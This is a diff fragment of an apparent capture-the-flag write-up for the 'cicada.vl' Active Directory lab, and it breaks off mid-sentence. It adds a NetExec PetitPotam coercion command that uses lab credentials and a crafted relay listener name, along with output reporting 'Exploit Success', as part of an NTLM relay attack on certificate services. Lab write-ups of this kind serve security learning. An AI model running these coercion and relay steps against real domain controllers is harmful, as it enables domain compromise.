@@ -327,4 +327,13 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Servers started, waiting for connections
 ```
-This has setup ntlm relay with 
+This has setup ntlm relay with a valid template `DomainController` which has enrollee rights for domain controllers
+
+```python
+nxc smb DC-JPQ225.cicada.vl -d cicada.vl -u rosie.powell -p 'Cicada123' -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123 
+COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
+COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
+```
+This coerced the DC machine account to connect to NTLMrelayX then 
